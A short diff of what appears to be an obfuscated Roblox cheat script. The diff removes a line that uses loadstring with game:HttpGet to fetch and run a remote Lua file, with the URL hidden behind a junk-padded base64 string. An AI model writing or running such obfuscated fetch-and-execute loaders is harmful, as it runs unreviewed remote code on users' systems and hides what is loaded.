@@ -92,4 +92,5 @@ misc:Button(mNIzsSHuMkPMqfTbFOyZmZrTZFYMsOxHgAmJGFffYdHbsAJgkdUmDAbLIZxsRzhDGu('
 AntiAfk()
 end)
     
-loadstring(game:HttpGet(mNIzsSHuMkPMqfTbFOyZmZrTZFYMsOxHgAmJGFffYdHbsAJgkdUmDAbLIZxsRzhDGu('YQxUDkLmGkLhvuRUeBEXQbJdWRceeyWvwEZBlANgyYZcMCTbCOUqjVIaHR0cHM6Ly9zb25pYzk5OC5naXRodWIuaW8vc29uaWNodWIvU2hpdC9CcENvdW50ZXIubHVh')))()    
+
+    
